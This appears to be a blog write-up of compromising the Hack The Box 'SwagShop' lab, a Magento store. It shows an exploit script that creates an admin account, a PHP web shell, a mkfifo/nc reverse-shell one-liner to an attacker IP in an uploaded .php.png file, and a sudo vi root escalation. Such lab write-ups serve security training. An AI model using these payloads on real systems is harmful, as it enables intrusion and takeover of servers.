---
layout: post
title:  "SwagShop Writeup - Hack The Box"
date:   2025-07-24
desc: ""
keywords: "HTB,OSCP,OSWE,eWPT,Linux,Magento CMS Exploitation,Magento Froghopper Attack,Sudoers Abuse,Easy"
categories: [HTB]
tags: [HTB,OSCP,OSWE,eWPT,Linux,Magento CMS Exploitation,Magento Froghopper Attack,Sudoers Abuse,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

I spent a lot of time with this **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** lab, I did a lot of research and I made **many mistakes** on the way to **Engage** the machine. It's not a very complex machine, that's why it's rated as **Easy**, I think because you don't have to apply very elaborate exploitation methods but you do have to spend some time researching the technology involved and its vulnerabilities. So I'm going to access my **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** account to spawn the machine and continue the continuous practice in this field of **Information Security**.

<br /><br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I will use `ping` to verify that I already have access to the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** lab through the **VPN**, and when the packets are received correctly I can perform my next validation, which is to find out with `whichSystem.py` (**[hack4u](https://hack4u.io/){:target="_blank"}** tool) the **OS** installed on the target machine, thanks to the **TTL value** it is highly probable that it is **Linux**. I can now start the **Reconnaissance** phase with my favorite tool to list the open ports on the victim machine, `nmap`, although there are many others and also excellent (`masscan` is one). With the `nmap` scripts I leak information about the services and their versions, which allows me to know the **Codename** of the machine, a data that many times can give me a clue if containers are being implemented or not. The first protocol I investigate is **HTTP** (port **80**) which has a large attack surface in general, but first I will add the domain I found with `nmap` to my **hosts** file, and with `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I disclose the technologies behind the application. There are older versions that must have known vulnerabilities, such as **JQuery**, which may be vulnerable to **Prototype Pollution**.

> **Prototype pollution** is a type of vulnerability in **JavaScript** that allows attackers to modify the properties of an **object's prototype**, potentially leading to security breaches. By manipulating the ```__proto__``` property, attackers can introduce new properties or modify existing ones on the **prototype**, which can then be inherited by other objects in the application. This can lead to **unexpected behavior** and, in some cases, allow attackers to **execute arbitrary code** or cause **denial-of-service**. 

```bash
ping -c 2 10.10.10.140
whichSystem.py 10.10.10.140
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.140 -oG allPorts
nmap -sCV -p22,80 10.10.10.140 -oN targeted
cat targeted
#     --> OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
#     google.es --> OpenSSH 7.6p1 4ubuntu0.7 launchpad      Bionic
#     --> Apache httpd 2.4.29
#     google.es --> apache httpd 2.4.29 launchpad           Bionic
#     --> http://swagshop.htb/

nvim /etc/hosts
cat /etc/hosts | tail -n 1
ping -c 1 swagshop.htb
whatweb http://10.10.10.140

# http://swagshop.htb/
```

<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The web application is a **Magento CSM**, and with `searchsploit` I find some exploits in **ExploitDB** very interesting, but I don't have the **CMS version** yet. I can't find default credentials that allow me to access the **Dashboard** with a privileged account, but I do have the possibility to create a new one. After fulfillifng the requirements of the application I succeed to register and access my administration panel to continue my research of the different functionalities it has, maybe I can leak sensitive information or upload malicious files through the account settings, but I can't find anything at the moment.

> **Magento** is an open-source e-commerce platform built using **PHP** that provides businesses with the tools to create and manage online stores. It's known for its flexibility, scalability, and extensive customization options, making it a popular choice for both small businesses and large enterprises. **Magento** was acquired by Adobe in 2018 and is now part of their **Adobe Commerce** product.

```bash
searchsploit magento

# http://swagshop.htb/index.php/customer/account/create/
# oldboy@swagshop.htb           :(
# oldboy@oldb.com               :)
```

<br/>
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Since I can't find much, I'm going to resort to an `nmap` script, **http-enum**, which performs an initial web server fingerprint and leaks me some hidden directories. Most of the resources are **.php** files, which are going to be interpreted by the server so I won't be able to investigate the source code to leak sensitive information in some comment or understand the application logic that would allow me to compromise the system.

```bash
nmap --script http-enum -p80 10.10.10.140 -oN webScan
```

<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to use `wfuzz`, a specialized web file and directory discovery tool, to search for more information. I find some resources that I can investigate from my browser but I still can't succeed in finding something that can help me a lot in the **Engagement** of the system, such as the **CMS** version. I had not noticed in the **URL**, how the different web pages and resources are loaded, so I will use this route to perform a new search with `wfuzz`. I find a new authentication panel in the hidden **admin** folder, but it still does not leak the application version.

```bash
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://swagshop.htb/FUZZ
# http://swagshop.htb/app/

wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://swagshop.htb/index.php/FUZZ

# http://swagshop.htb/index.php/...
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://swagshop.htb/index.php/FUZZ
# Version: ...Copyright © 2025 Magento Inc... ?
```

<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

In some of the resources that I investigated, I think I could see the **CMS** version, but among so much information and with my head very burned I overlooked it, so with the list of exploits found with `searchsploit` I choose one that I can try, maybe I will be lucky and succeed in exploiting it. I make an analysis of the code to understand how it succeeds in executing command remotely, the first thing to modify is the value of the target, I also find the path where the exploitation is performed and I notice that the main objective of the script is to create an **admin** account. When running the exploit I find several errors that I'm correcting one at a time, first I perform a cleaning of the code to avoid problems with some special characters, I must also use the correct version of **Python** for execution, I correct the declaration of the ```print``` function and the data type of the variable **pfilter** (error I found thanks to the **pdb** library). Finally I succeed in executing the exploit without getting any error message.

```bash
searchsploit magento
searchsploit -x xml/webapps/37977.py

searchsploit -m xml/webapps/37977.py
mv 37977.py magento_exploit.py
nvim magento_exploit.py
python2 magento_exploit.py
# ...Python 2 is no longer supported...
python3 magento_exploit.py
# Missing parentheses in call to 'print'. Did you mean print(...)?

nvim magento_exploit.py
python3 magento_exploit.py
# TypeError: a bytes-like object is required, not 'str'

nvim magento_exploit.py

python3 magento_exploit.py
# pfilter.encode())

python3 magento_exploit.py
# :)
```

<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I just need to modify the **URL** to the one of my target machine, I will also customize the **username** and **password** that will be registered with **admin** privileges. After executing the exploit it informs me that the new account was created (I failed to update a line of code for the message to be correct) and I succeed in accessing the **Dashboard** with maximum privileges, I can also know the version of the **CMS Magento**, a <ins>little late already</ins>.

```bash
nvim magento_exploit.py
# target, query = q.replace("\n", "").format(username="oldboy", password="oldboy123")
python3 magento_exploit.py

# http://swagshop.htb/index.php/admin
# :)
```

<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Thanks to the help of the community that guides me a little on the next step I have to do, I start to investigate how to exploit this version of the **CMS Magento** and I find an excellent research on **[how to apply the Froghopper attack methodology](https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper){:target="_blank"}** that would allow me to upload a malicious file and thus execute commands (obtain an **RCE**). I follow the instructions indicated in the web resource, in the **Configuration Panel** I must activate the Magento developer “Allow Symlink” function for **Magento Newsletter Template**, the next thing is to add a **new Newsletter Template** and finally in the **Category Management** tab add a new one where I can upload a double extension **.php.png** file with **PHP** code from a **web shell**. Hovering over the link of the newly uploaded file I get the **URL** of the path where it was stored, so if I access it it does exist, but if I try to execute commands I don't get it, so I will continue reading the resource I found on the web to achieve my goal.

> In some unpatched versions of **Magento 1**, several vulnerabilities can be combined to allow attackers to upload files and execute them on the server to gain **full control** of the file system. One common attack methodology was nicknamed **“Froghopper”** by **Foregenix** analysts because the attackers frequently used an image file featuring a cartoon frog named **‘Pepe’** to introduce malicious code to the system.

> **Magento Newsletter functionality**, which allows the creation of customer newsletters from templates, and the way in which **Magento** interprets the template files.

```bash
nvim pwn3d.php.png
cat !$
```

> **pwn3d.php.png**:

```php
<?php
  echo "<pre>" . shell_exec($_REQUEST["cmd"]) . "</pre>";
?>
```

```bash
# http://swagshop.htb/media/catalog/category/pwn3d.php.png
# :)

tcpdump -i tun0 icmp -n
# http://swagshop.htb/index.php/admin/newsletter_template/preview/id/1/key/b3923f85ba03f54377e3e002fbb14a84/?cmd=ping%20-c%201%2010.10.14.5
# :(
```

<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I read **more carefully** the article I found on the web and found the step I'm missing to get an **RCE**, so I'm going to restart the attack. I modify the malicious file to directly upload one, whose content is a one-liner of a **Reverse Shell** from the **[PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}** web site, but when hovering over the link of the new uploaded file I notice that the double extension has been modified (because there was already a file on the server with the same name), so I'm going to upload it again but with another name. The last step is to modify the **Template** that I had created in previous steps and I inject a **block of template code** (also make sure that the **declaration is correct**, because I made a mistake in the first attempt). Finally I get an **RCE** by previewing the Template and succeed in catching the incoming **Reverse Shell** with `nc` on port **443**.

> **Attacker Machine**:

```bash
nvim pwn3d.php.png
```

> **pwn3d.php.png**:

```php
<?php
  system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 443 >/tmp/f");
?>
```

```bash
nc -nlvp 443
# http://swagshop.htb/index.php/admin/newsletter_template/index/key/880df9d219609c129c7cc2fc0ab3a034/
```

> **Victime Machine**:

```cmd
whoami
hostname
hostname -I
```

<br/>
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I perform a **Console treatment** to have a better performance of my console in the following phases and I also adjust the Shell proportions. I start the **Enumeration** phase and I check that the **Codename** is **bionic** and that I can already access the content of the first flag. I also find that the `pkexec` tool has the **SUID** bit enabled, so it is possible to use **[PwnKit](https://github.com/ly4k/PwnKit){:target="_blank"}** and **Escalate Privileges**. As it is not the intended path I go to look for another attack vector, and after **tray harder** for a while I find a special permission with `sudo -l`, which allows me to run the `vi` binary impersonating the **root** user. To **Escalate Privileges** I just have to resort to **[GTFObins](https://gtfobins.github.io/gtfobins/vi/#shell){:target="_blank"}** to find the instructions to get a **Reverse Shell** and access the contents of the last flag. Machine pwned!

> **Attacker Machine**:

```bash
script /dev/null -c bash
# [Ctrl^Z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128

id
groups
uname -a
lsb_release -a
cat /etc/passwd | grep 'sh$'
find \-perm -4000 2>/dev/null

sudo -l
# (root) NOPASSWD: /usr/bin/vi /var/www/html/*

sudo /usr/bin/vi /var/www/html/index.php

  :set shell=/bin/bash
  :shell

whoami
# :)
```

<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> The **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machines really seem to me to be the best for improving the skills one needs to be a professional in the **Information Security** field. I found the box to be a lot of fun, although most of the **Engagement** was based on researching a single technology, getting then exploiting vulnerabilities can be a challenge when the attacks don't work. I had to do a lot of **trial and error** to achieve my goal, but satisfaction is guaranteed with **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** labs. I'm going to kill the box and look for my next target.

<br /><br />
<img src="{{ site.img_path }}/swagshop_writeup/SwagShop_59.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
